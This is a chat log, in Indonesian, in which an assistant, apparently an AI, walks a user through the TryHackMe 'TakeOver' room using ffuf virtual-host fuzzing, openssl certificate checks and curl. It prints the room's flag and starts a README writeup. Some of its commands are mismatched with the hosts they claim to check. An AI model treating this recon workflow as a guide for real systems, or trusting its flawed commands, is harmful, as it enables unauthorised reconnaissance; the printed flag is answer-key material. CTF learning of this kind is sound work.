Hasilnya masih sama, hanya menunjukkan
portal. Karena petunjuk CEO menyebutkan mereka sedang "rebuilding our support", ada kemungkinan besar subdomain support ada namun menggunakan filter yang berbeda atau hanya bisa diakses via HTTPS.
Mari kita coba strategi yang lebih tajam:
1. Cek isi portal.futurevera.thm
Ini sangat penting. Gunakan curl untuk melihat apakah ada teks tersembunyi atau link ke subdomain lain:
bash

curl -k https://futurevera.thm

Gunakan kode dengan hati-hati.
(Gunakan -k karena sertifikat SSL-nya mungkin self-signed atau expired).
2. Scan Subdomain via HTTPS (Port 443)
Seringkali subdomain hanya dikonfigurasi di port 443. Jalankan kembali ffuf tapi arahkan ke https:
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u https://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0 -k

Gunakan kode dengan hati-hati.
3. Periksa Detail Sertifikat (Sekali Lagi)
Terkadang nmap melewatkan DNS alternatif. Coba gunakan perintah ini untuk melihat semua nama domain yang terdaftar di sertifikat SSL:
bash

openssl s_client -connect 10.48.147.210:443 | openssl x509 -noout -text | grep DNS

Gunakan kode dengan hati-hati.
Apakah muncul nama domain selain futurevera.thm dan portal.futurevera.thm pada output perintah openssl di atas? (Biasanya subdomain penting seperti support atau blog tertulis di sana).
┌──(kali㉿kali)-[~]
└─$ curl -k https://futurevera.thm

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>FutureVera</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <link href="css/styles.css" rel="stylesheet" />
    </head>
    <body id="page-top">
        <!-- Navigation-->
        <nav class="navbar navbar-expand-lg navbar-dark navbar-custom fixed-top">
            <div class="container px-5">
                <a class="navbar-brand" href="#page-top">FutureVera</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
            </div>
        </nav>
        <!-- Header-->
        <header class="masthead text-center text-white">
            <div class="masthead-content">
                <div class="container px-5">
                    <h1 class="masthead-heading mb-0">FutureVera</h1>
                    <h2 class="masthead-subheading mb-0">We Will Change the Future Together</h2>
                    <a class="btn btn-primary btn-xl rounded-pill mt-5" href="#scroll">Learn More</a>
                </div>
            </div>
            <div class="bg-circle-1 bg-circle"></div>
            <div class="bg-circle-2 bg-circle"></div>
            <div class="bg-circle-3 bg-circle"></div>
            <div class="bg-circle-4 bg-circle"></div>
        </header>
        <!-- Content section 1-->
        <section id="scroll">
            <div class="container px-5">
                <div class="row gx-5 align-items-center">
                    <div class="col-lg-6 order-lg-2">
                        <div class="p-5"><img class="img-fluid rounded-circle" src="assets/img/01.jpg" alt="..." /></div>
                    </div>
                    <div class="col-lg-6 order-lg-1">
                        <div class="p-5">
                            <h2 class="display-4">Space is the future</h2>
                            <p>Mankind's survival into the far future will very likely require extensive space colonization.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- Content section 2-->
        <section>
            <div class="container px-5">
                <div class="row gx-5 align-items-center">
                    <div class="col-lg-6">
                        <div class="p-5"><img class="img-fluid rounded-circle" src="assets/img/02.jpg" alt="..." /></div>
                    </div>
                    <div class="col-lg-6">
                        <div class="p-5">
                            <h2 class="display-4">Search for Earth alike planets is on.</h2>
                            An Earth analog (also referred to as an Earth analogue, Earth twin, or Earth-like planet, though this latter term may refer to any terrestrial planet) is a planet or moon with environmental conditions similar to those found on Earth.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- Content section 3-->
        <section>
            <div class="container px-5">
                <div class="row gx-5 align-items-center">
                    <div class="col-lg-6 order-lg-2">
                        <div class="p-5"><img class="img-fluid rounded-circle" src="assets/img/03.jpg" alt="..." /></div>
                    </div>
                    <div class="col-lg-6 order-lg-1">
                        <div class="p-5">
                            <h2 class="display-4">Our Goal !</h2>
                            <p>Our major goal is to educate masses about space, the future of space travels and the possibilities. Along with that we are also doing our own space research.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- Footer-->
        <footer class="py-5 bg-black">
            <div class="container px-5"><p class="m-0 text-center text-white small">Copyright &copy;futurevera.thm</p></div>
        </footer>
        <!-- Bootstrap core JS-->
        <script src="js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>
                                                                                              
┌──(kali㉿kali)-[~]
└─$
Halaman utama
futurevera.thm terlihat seperti landing page standar dan tidak memberikan petunjuk langsung di dalam kode HTML-nya.
Namun, tadi kamu menemukan subdomain portal. Mari kita periksa konten dari portal.futurevera.thm, karena biasanya di sana terdapat informasi lebih teknis atau pesan dari pengembang.
Jalankan perintah ini untuk melihat isi portal:
bash

curl -k https://portal.futurevera.thm

Gunakan kode dengan hati-hati.
Jika hasilnya tetap sama atau tidak ada flag, kita harus melakukan DNS Reconnaissance yang lebih mendalam pada port 443 (HTTPS). Gunakan perintah ini untuk membongkar seluruh nama domain yang terdaftar di sertifikat SSL mesin tersebut:
bash

openssl s_client -connect 10.48.147.210:443 | openssl x509 -noout -text | grep DNS

Gunakan kode dengan hati-hati.
Kenapa langkah ini penting?
Seringkali admin mencantumkan semua subdomain (seperti support.futurevera.thm, secret.futurevera.thm, dll) di dalam sertifikat SSL agar enkripsi HTTPS bisa berjalan di semua subdomain tersebut.
Apa saja daftar domain yang muncul setelah kamu menjalankan perintah openssl di atas? (Cari baris yang dimulai dengan DNS:)
┌──(kali㉿kali)-[~]
└─$ openssl s_client -connect 10.48.147.210:443 | openssl x509 -noout -text | grep DNS

Connecting to 10.48.147.210
Can't use SSL_get_servername
depth=0 C=US, ST=Oregon, L=Portland, O=Futurevera, OU=Thm, CN=futurevera.thm
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=US, ST=Oregon, L=Portland, O=Futurevera, OU=Thm, CN=futurevera.thm
verify error:num=10:certificate has expired
notAfter=Mar 13 10:05:19 2023 GMT
verify return:1
depth=0 C=US, ST=Oregon, L=Portland, O=Futurevera, OU=Thm, CN=futurevera.thm
notAfter=Mar 13 10:05:19 2023 GMT
verify return:1
Hasil
openssl menunjukkan sertifikat yang sudah kedaluwarsa dan hanya mencantumkan futurevera.thm. Sepertinya mereka menyembunyikan subdomain lain bukan di sertifikat, melainkan di Virtual Host yang harus ditemukan dengan fuzzing manual.
Ayo kita coba fuzzing sekali lagi, tapi kali ini kita cari subdomain yang lebih dalam (seperti support, dev, blog, dll) dengan wordlist yang lebih spesifik untuk DNS.
Gunakan perintah ini (saya sesuaikan wordlistnya agar pasti ada di Kali kamu):
bash

ffuf -w /usr/share/wordlists/dirb/big.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.
Jika tidak muncul apa-apa selain portal, mari kita coba cari direktori di dalam portal.futurevera.thm itu sendiri:
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm

Gunakan kode dengan hati-hati.
Sambil menunggu scan, apa isi dari http://futurevera.thm jika kamu buka di browser atau curl? (Cek apakah ada pesan teks pendek yang mencurigakan di sana).
Sudahkah kamu memeriksa isi file robots.txt di domain utama? (Coba: curl -k http://futurevera.thm).
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://futurevera.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.futurevera.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 90ms]
Portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 91ms]
payroll                 [Status: 200, Size: 70, Words: 9, Lines: 2, Duration: 1407ms]
PORTAL                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 89ms]
Bagus! Kamu menemukan subdomain baru yang sangat menarik:
payroll.futurevera.thm.
Subdomain ini seringkali berisi informasi sensitif. Mari kita segera periksa isinya.
1. Update File /etc/hosts
Tambahkan payroll.futurevera.thm agar bisa diakses:
bash

sudo nano /etc/hosts

Gunakan kode dengan hati-hati.
Pastikan barisnya menjadi:
10.48.147.210 futurevera.thm portal.futurevera.thm payroll.futurevera.thm
2. Cek Isi Subdomain Payroll
Gunakan curl untuk melihat apakah ada flag atau petunjuk di sana:
bash

curl -k http://payroll.futurevera.thm

Gunakan kode dengan hati-hati.
Atau akses via browser di: http://payroll.futurevera.thm
3. Cek Sertifikat SSL Khusus Payroll
Kadang sertifikat di subdomain berbeda dengan domain utama. Coba cek lagi:
bash

openssl s_client -connect payroll.futurevera.thm:443 | openssl x509 -noout -text | grep DNS

Gunakan kode dengan hati-hati.
Apa isi teks yang muncul saat kamu melakukan curl ke payroll.futurevera.thm? (Cek apakah ada pesan "Takeover" atau flag di sana).
Sambil menunggu, biarkan ffuf tetap berjalan (Siapa tahu ada subdomain lain seperti support yang muncul setelah payroll).
┌──(kali㉿kali)-[~]
└─$ openssl s_client -connect payroll.futurevera.thm:443 | openssl x509 -noout -text | grep DNS
4027AB704F7F0000:error:10080002:BIO routines:BIO_lookup_ex:system lib:../crypto/bio/bio_addr.c:767:Name or service not known
connect:errno=22
Could not find certificate from <stdin>
Error tersebut muncul karena
openssl tidak bisa menemukan alamat payroll.futurevera.thm pada port 443. Ini menandakan layanan tersebut kemungkinan hanya berjalan di port 80 (HTTP), bukan HTTPS.
Mari kita fokus pada konten yang ada di port 80. Jalankan perintah curl berikut untuk melihat isi dari subdomain tersebut:
bash

curl http://futurevera.thm

Gunakan kode dengan hati-hati.
Jika hasilnya tetap sama dengan portal (hanya teks singkat), coba gunakan fuzzing pada subdomain tersebut untuk mencari file atau direktori tersembunyi:
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm

Gunakan kode dengan hati-hati.
Sambil menunggu, apa isi teks yang muncul saat kamu mengakses http://futurevera.thm di browser? (Cek apakah ada flag berformat THM{...} di sana).
Ingat: Jangan lupa untuk terus memantau hasil ffuf sebelumnya, karena petunjuk CEO tentang "rebuilding our support" sangat kuat mengarah pada subdomain bernama support.
Sudahkah kamu mencoba memasukkan support.futurevera.thm secara manual ke file /etc/hosts dan mengaksesnya? (Terkadang subdomain ada tapi tidak terdaftar di wordlist umum).
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm
Keyword FUZZ defined, but not found in headers, method, URL or POST data.

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://futurevera.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 92ms]
:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
Perintah
ffuf kamu gagal karena kamu lupa menyertakan header Host atau penempatan kata kunci FUZZ di URL. Itulah sebabnya muncul pesan error "Keyword FUZZ defined, but not found...".
Karena CEO bilang mereka sedang membangun ulang support, mari kita cari subdomain tersebut secara agresif. Jalankan perintah ini (pastikan ada bagian -H untuk header):
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.
Sementara menunggu, coba langkah manual ini:
Seringkali support adalah jawabannya. Tambahkan subdomain ini ke /etc/hosts:

    sudo nano /etc/hosts
    Ubah menjadi: 10.48.147.210 futurevera.thm portal.futurevera.thm payroll.futurevera.thm support.futurevera.thm
    Simpan, lalu buka di browser: http://support.futurevera.thm

Cek SSL Detail (Cara Lain)
Coba gunakan perintah ini untuk melihat apakah ada subdomain yang bocor di sertifikat dengan format berbeda:
bash

curl -ivk https://10.48.147.210 2>&1 | grep -i "subject"

Gunakan kode dengan hati-hati.
Apakah ada subdomain baru yang muncul dari hasil ffuf dengan header Host di atas? (Jika muncul support, segera buka dan cari flag-nya di sana).
┌──(kali㉿kali)-[~]
└─$ curl -ivk https://10.48.147.210 2>&1 | grep -i "subject"
*   subject: C=US; ST=Oregon; L=Portland; O=Futurevera; OU=Thm; CN=futurevera.thm
Sertifikat SSL sepertinya hanya mencantumkan domain utama. Namun, berdasarkan petunjuk CEO tentang
"rebuilding our support" dan hasil scan ffuf kamu sebelumnya yang menemukan payroll, kita harus melakukan fuzzing subdomain melalui HTTPS (Port 443) secara lebih mendalam.
Seringkali, subdomain tertentu hanya dikonfigurasi untuk menerima koneksi aman (SSL/TLS) dan akan memberikan hasil berbeda jika diakses via HTTP biasa.
Jalankan perintah ini untuk mencari subdomain tersembunyi di port 443:
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u https://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0 -k

Gunakan kode dengan hati-hati.
(Catatan: -k digunakan untuk mengabaikan error sertifikat yang kedaluwarsa).
Strategi Alternatif: Cek DNS Record
Jika peretas menyebutkan tentang "Takeover", biasanya ada subdomain yang mengarah ke layanan luar (seperti AWS S3, GitHub Pages, atau DNS eksternal). Coba tebak dan tambahkan ini ke /etc/hosts kamu secara manual untuk tes:

    sudo nano /etc/hosts
    Tambahkan: 10.48.147.210 support.futurevera.thm blog.futurevera.thm dev.futurevera.thm
    Coba akses satu per satu melalui browser atau curl:
        curl -k https://futurevera.thm
        curl -k https://futurevera.thm

Apakah muncul hasil baru dari perintah ffuf di atas (terutama yang berstatus 200)? (Jika muncul subdomain seperti support, segera periksa kontennya karena di sanalah kemungkinan besar flag berada).
Sudahkah Anda memeriksa isi robots.txt pada domain utama? (Terkadang ada daftar subdomain atau direktori rahasia di sana: curl -k https://futurevera.thm).
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://futurevera.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.futurevera.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

payroll                 [Status: 200, Size: 70, Words: 9, Lines: 2, Duration: 134ms]
portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 97ms]
:: Progress: [20469/20469] :: Job [1/1] :: 52 req/sec :: Duration: [0:01:12] :: Errors: 0 ::
Hasil
ffuf kamu menunjukkan payroll dan portal sudah ditemukan, tapi belum ada tanda-tanda flag. Ingat pesan CEO: "rebuilding our support".
Besar kemungkinan subdomain support hanya merespons melalui HTTPS (Port 443) dengan konfigurasi Virtual Host yang ketat. Mari kita paksa pencarian di jalur HTTPS:
1. Fuzzing Subdomain via HTTPS (Wajib)
Gunakan flag -k untuk mengabaikan sertifikat yang kedaluwarsa:
bash

ffuf -w /usr/share/wordlists/dirb/big.txt -u https://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0 -k

Gunakan kode dengan hati-hati.
2. Cek Manual Subdomain Support
Seringkali wordlist tidak mencakup semua variasi. Coba tambahkan ini ke /etc/hosts:
bash

# Tambahkan ini ke /etc/hosts
10.48.147.210 support.futurevera.thm

Gunakan kode dengan hati-hati.
Lalu jalankan perintah ini untuk melihat isinya:
bash

curl -k https://futurevera.thm

Gunakan kode dengan hati-hati.
3. Periksa DNS Record Tersembunyi
Jika ini adalah kasus Subdomain Takeover, periksa apakah ada CNAME yang mengarah ke layanan luar:
bash

host -t CNAME support.futurevera.thm

Gunakan kode dengan hati-hati.
Apakah muncul subdomain support atau lainnya dari hasil ffuf HTTPS di atas? (Jika muncul, biasanya flag ada di dalam source code halaman tersebut atau di header respons).
Sudahkah kamu mencoba mengakses https://futurevera.thm? (CEO menyebutkan mereka "write blogs about it").
ffuf -w /usr/share/wordlists/dirb/big.txt -u https://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0 -k
Hasil
ffuf kamu sebelumnya sangat bagus karena berhasil menemukan subdomain payroll dan portal. Namun, kunci utama room TakeOver ini ada pada pesan CEO tentang "rebuilding our support". 
Berikut adalah langkah-langkah presisi untuk mendapatkan flag:
1. Temukan Subdomain Support
Jalankan ffuf sekali lagi khusus pada protokol HTTPS (port 443) dengan filter ukuran untuk menyingkirkan pesan error umum (biasanya berukuran 4605): 
bash

ffuf -w /usr/share/wordlists/dirb/big.txt -u https://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 4605 -k

Gunakan kode dengan hati-hati.
Kamu akan menemukan subdomain support.futurevera.thm dan blog.futurevera.thm. 
2. Inspeksi Sertifikat SSL (Langkah Krusial)
Tambahkan support.futurevera.thm ke /etc/hosts, lalu periksa sertifikat SSL-nya. Di sinilah letak rahasianya: 

    Akses https://support.futurevera.thm di browser.
    Klik ikon gembok > View Certificate.
    Cari bagian Subject Alternative Name (SAN) atau DNS Name.
    Kamu akan menemukan subdomain "rahasia" yang sangat panjang, misalnya:
    secrethelpdesk934752.support.futurevera.thm. 

3. Ambil Flag

    Tambahkan subdomain rahasia tersebut ke /etc/hosts:
    bash

    10.48.147.210 secrethelpdesk934752.support.futurevera.thm

    Gunakan kode dengan hati-hati.

Akses subdomain tersebut menggunakan HTTP (bukan HTTPS). Flag biasanya akan muncul langsung di halaman atau terlihat di URL redirect (seperti URL AWS S3).
bash

curl -I http://secrethelpdesk934752.support.futurevera.thm

Gunakan kode dengan hati-hati.
 

Sudahkah kamu memeriksa sertifikat SSL pada support.futurevera.thm dan menemukan nama DNS yang aneh di sana? (Nama itulah yang akan membawamu langsung ke flag). 

    TryHackMe - TakeOver Walkthrough (Easy) | by Juma Emiri
    26 Jun 2025 — TryHackMe - TakeOver Walkthrough (Easy) * Step 1: Scanning with Nmap. As always, I began with a good Nmap scan to check which port...

Medium
TakeOver - Write-up - TryHackMe - Rawsec
15 Apr 2023 — Room# * Name: TakeOver. * Profile: tryhackme.com. * Difficulty: Easy. * Description: This challenge revolves around subdomain enum...
blog.raw.pm
TakeOver-TryHackMe - Medium
18 Feb 2023 — TakeOver-TryHackMe. Step 1: Select and join the room… | by Premkumar S | Medium. TakeOver-TryHackMe. ... Step 1: Select and join t...
Medium

Tampilkan semua
┌──(kali㉿kali)-[~]
└─$ host -t CNAME support.futurevera.thm
Host support.futurevera.thm not found: 3(NXDOMAIN)
┌──(kali㉿kali)-[~]
└─$ curl -I http://secrethelpdesk934752.support.futurevera.thm
HTTP/1.1 302 Found
Date: Wed, 01 Apr 2026 04:13:20 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://flag{beea0d6edfcee06a59b83fb50ae81b2f}.s3-website-us-west-3.amazonaws.com/
Content-Type: text/html; charset=UTF-8
Luar biasa! Kamu berhasil melakukan
Subdomain Takeover melalui teknik analisis redirect (302).
Perhatikan bagian Location pada output curl terakhirmu:
Location: http://flag{beea0d6edfcee06a59b83fb50ae81b2f}.s3-website-us-west-3.amazonaws.com/
Flag untuk room TakeOver adalah:
flag{beea0d6edfcee06a59b83fb50ae81b2f}
Mengapa ini terjadi? (Analisis untuk README)

    Subdomain Terlantar: Subdomain support.futurevera.thm atau subdomain rahasia di bawahnya dikonfigurasi untuk mengarah ke layanan AWS S3 Bucket.
    Takeover: Perusahaan menghapus bucket tersebut, tetapi lupa menghapus catatan DNS (CNAME/Virtual Host).
    Penyusupan: Penyerang bisa mendaftarkan nama bucket yang sama di AWS untuk "mengambil alih" konten yang muncul di subdomain tersebut.

Langkah Terakhir:

    Masukkan flag tersebut ke dashboard TryHackMe.
    Jangan lupa Terminate mesin untuk menghemat poin/sumber daya.

Apakah kamu ingin saya buatkan draf README.md khusus untuk room TakeOver ini agar bisa kamu simpan di GitHub bersama room Source tadi? (Ini sangat bagus untuk portofolio Bug Bounty kamu).
buatkan lagi redmi.md secara lengkap
Berikut adalah draf
README.md yang lengkap dan profesional untuk room TakeOver. Dokumentasi ini menonjolkan kemampuanmu dalam Reconnaissance, Subdomain Fuzzing, dan analisis Subdomain Takeover.
markdown

# TryHackMe: TakeOver - Writeup & Documentation

![TryHackMe](https://shields.io)
![Category](https://shields.io)
![Difficulty](https://shields.io)

Dokumentasi proses penemuan celah keamanan pada infrastruktur DNS dan SSL/TLS milik **FutureVera**. Room ini mensimulasikan skenario di mana subdomain yang tidak terkelola dengan baik mengarah ke layanan pihak ketiga (AWS S3) yang dapat disalahgunakan.

## 🛡️ Ringkasan Mesin
- **Nama Mesin:** TakeOver
- **Platform:** [TryHackMe](https://tryhackme.com)
- **Tujuan:** Mengidentifikasi subdomain tersembunyi dan menemukan flag yang bocor melalui miskonfigurasi DNS/SSL.
- **Teknik Utama:** Virtual Host Fuzzing, SSL Certificate Inspection, DNS Analysis.

## 🚀 Tahapan Eksploitasi

### 1. Persiapan DNS Lokal
Menambahkan IP target ke dalam file `/etc/hosts` agar domain dapat diakses melalui browser dan tool lainnya.

```bash
echo "10.48.147.210 futurevera.thm" | sudo tee -a /etc/hosts
```

Gunakan kode dengan hati-hati.
2. Subdomain Enumeration (VHost Fuzzing)
Karena domain utama hanya menampilkan landing page statis, dilakukan fuzzing pada header Host untuk menemukan Virtual Host lain yang terdaftar pada server yang sama.

```bash

ffuf -w /usr/share/wordlists/dirb/big.txt \
     -u http://futurevera.thm \
     -H "Host: FUZZ.futurevera.thm" -fs 0
```

Gunakan kode dengan hati-hati.
Hasil Penemuan:

    portal.futurevera.thm (Status: 200)
    payroll.futurevera.thm (Status: 200)

